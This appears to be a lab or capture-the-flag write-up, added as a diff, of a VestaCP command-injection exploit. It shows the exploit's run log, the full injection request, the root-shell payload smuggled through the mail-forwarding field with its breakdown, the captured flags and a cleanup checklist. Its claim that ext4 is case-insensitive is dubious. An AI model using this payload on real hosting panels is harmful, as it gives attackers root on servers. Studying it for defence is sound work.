@@ -1,0 +1,93 @@
+=== scripts/vesta-rce-exploit.py — full run ===
+python3 vesta-rce-exploit.py https://192.168.161.156:8083 jack 3PUKsX98BMupBiCf
+
+[INFO] Attempting login to https://192.168.161.156:8083 as jack
+[+] Logged in as jack
+[INFO] Checking for existing webshell or creating one
+[!] 4wfarbc2dg.poc not found, creating one...
+[+] 4wfarbc2dg.poc added
+[+] 4wfarbc2dg.poc found, looking up webshell
+[!] webshell not found, creating one..
+[+] Webshell uploaded
+[INFO] Creating mailbox on domain 4wfarbc2dg.poc
+[!] Mail domain not found, creating one..
+[+] Mail domain created
+[+] Mail account created
+[INFO] Editing mailbox to test payload
+[INFO] Deploying backdoor via mailbox editing
+[INFO] [+] Root shell possibly obtained. Enter commands:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+#
+
+
+=== Injection field: /api/v1/edit/mail/index.php ===
+POST /api/v1/edit/mail/index.php?domain=4wfarbc2dg.poc&account=<random>
+data:
+  save=save  token=<csrf>  v_domain=4wfarbc2dg.poc  v_password=
+  v_quota=unlimited  v_aliases=  v_fwd=<PAYLOAD>  v_credentials=
+  Username=@4wfarbc2dg.poc  v_account=<random>  Password=
+
+payload (no spaces; < and > do the argument separation):
+  ';bash</home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec>/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult;A='
+
+anatomy:
+  ';                                              close the panel's quoted argument, start a command
+  bash<.../cmdtoexec>.../cmdresult                run the staged file, redirect stdout (AS ROOT)
+  ;                                               end the command
+  A='                                             reopen a quote so the panel's line stays balanced
+
+handler: /usr/bin/sudo /usr/local/vesta/bin/v-edit-mail-account   (VESTA_CMD)
+
+
+=== Execution context proves the injection path ===
+# pwd
+/usr/local/vesta/web/api/v1/edit/mail
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+Reading: the root process inherited the cwd of the PHP request handler that invoked
+v-edit-mail-account. A root process whose cwd is a web request directory is the
+signature of panel-level command injection, not a binary exploit.
+
+
+=== Network context ===
+# ifconfig
+ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1384
+      inet 192.168.161.156  netmask 255.255.255.0  broadcast 192.168.161.255
+      ether fa:16:3e:be:56:c5
+lo:   inet 127.0.0.1  netmask 255.0.0.0
+
+(ens3 is a virtual NIC, mtu 1384 -> nested/virtualised lab host)
+
+
+=== Flags ===
+# cat /root/proof.txt
+d4640a77ca31e0ab126751f98e819888
+
+# cat /home/jack/local.txt
+9cfca959e54738e70905a4024d16a44a
+
+# find / -type f -name 'proof.txt' 2>/dev/null
+/root/proof.txt
+
+# find / -type f -name 'local.txt' 2>/dev/null
+/home/Jack/local.txt
+/home/jack/local.txt
+
+Note: /home/Jack and /home/jack both matched — case-insensitive filesystem
+(overlayfs on ext4), not two separate files.
+
+# ls
+index.php          <- cwd was /usr/local/vesta/web/api/v1/edit/mail
+
+
+=== Debris left on the target (cleanup checklist) ===
+/home/jack/web/4wfarbc2dg.poc/                     web domain + webshell + iamroot/
+/home/jack/web/4wfarbc2dg.poc/public_html/ownwebshell.php
+/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec
+/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult
+mail domain 4wfarbc2dg.poc + one mail account
+persisted mailbox forwarding entry containing the injected payload
+DNS records created by v-add-web-domain / v-add-mail-domain
